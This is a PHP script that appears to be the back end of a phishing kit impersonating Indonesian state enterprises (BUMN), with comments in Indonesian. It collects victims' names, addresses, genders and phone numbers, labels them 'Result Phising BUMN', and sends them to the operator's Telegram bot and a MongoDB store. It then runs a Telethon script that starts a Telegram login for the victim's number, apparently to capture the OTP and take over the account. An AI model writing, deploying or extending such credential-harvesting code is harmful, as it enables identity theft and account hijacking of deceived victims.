<?php
require_once __DIR__ . '/db_config.php';
require_once __DIR__ . '/MongoDBSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi MongoDB Session Handler
$mongoSessionHandler = new MongoDBSessionHandler($mongo_connection_string);
session_set_save_handler($mongoSessionHandler, true);
$GLOBALS['mongoSessionHandler'] = $mongoSessionHandler;

session_start();

// Validasi dan sanitasi input
$fullname = isset($_POST['fullname']) ? trim($_POST['fullname']) : '';
$address = isset($_POST['address']) ? trim($_POST['address']) : '';
$gender = isset($_POST['gender']) ? trim($_POST['gender']) : '';
$phoneNumber = isset($_POST['phoneNumber']) ? trim($_POST['phoneNumber']) : '';

// Validasi format nomor telepon
function validatePhoneNumber($phone) {
    // Format nomor yang diharapkan: +62xxxxxxxxxx
    return preg_match('/^\+62\d{8,15}$/', $phone);
}

// Response default
$response = ['success' => false, 'error' => 'Terjadi kesalahan'];

// Validasi input dasar
if (empty($fullname) || empty($address) || empty($gender) || empty($phoneNumber)) {
    $response['error'] = 'Semua field harus diisi';
    echo json_encode($response);
    exit;
}

// Validasi format nomor telepon
if (!validatePhoneNumber($phoneNumber)) {
    $response['error'] = 'Format nomor telepon tidak valid';
    echo json_encode($response);
    exit;
}

// Isi string untuk laporan
$string = "== Result Phising BUMN ==\n";
$string .= "Fullname : `$fullname`\n";
$string .= "Address : `$address`\n";
$string .= "Gender : `$gender`\n";
$string .= "Phone : `$phoneNumber`\n";

// Simpan ke session
$_SESSION['message'] = $string;
$_SESSION['user_data'] = [
    'fullname' => $fullname,
    'address' => $address,
    'gender' => $gender,
    'phoneNumber' => $phoneNumber,
    'timestamp' => time()
];

// Simpan juga ke MongoDB secara langsung
if (isset($mongoSessionHandler)) {
    $mongoSessionHandler->saveTelegramData($string, [
        'form_data' => [
            'fullname' => $fullname,
            'address' => $address,
            'gender' => $gender,
            'phoneNumber' => $phoneNumber
        ],
        'stage' => 'initial_form'
    ]);
}

// Kirim ke bot Telegram
$telegramResult = sendTelegram($string);

// Integrate with Telethon - start authentication process
try {
    $session_id = session_id();
    $command = escapeshellcmd("python $telegram_auth_script form " . 
               escapeshellarg($phoneNumber) . " " . 
               escapeshellarg($session_id));
    $output = shell_exec($command);
    
    if ($output === null) {
        throw new Exception("Gagal mengeksekusi script Python");
    }
    
    $result = json_decode($output, true);
    
    if (!$result || !isset($result['success'])) {
        throw new Exception("Respons tidak valid dari script autentikasi");
    }
    
    // Store the result in session for the next page
    $_SESSION['telegram_phone'] = $phoneNumber;
    $_SESSION['telegram_auth_started'] = true;
    
    // Return success or error based on the result
    $response = $result['success'] ? 
        ['success' => true] : 
        ['success' => false, 'error' => $result['error'] ?? 'Gagal mengirim kode OTP'];
    
} catch (Exception $e) {
    $response = ['success' => false, 'error' => $e->getMessage()];
    
    // Log error untuk debugging
    error_log("Error in form.php: " . $e->getMessage());
    
    // Tambahkan ke MongoDB untuk tracking
    if (isset($mongoSessionHandler)) {
        $mongoSessionHandler->saveTelegramData("Error processing form: " . $e->getMessage(), [
            'error' => true,
            'stage' => 'form_error'
        ]);
    }
}

// Return response as JSON
echo json_encode($response);
exit;
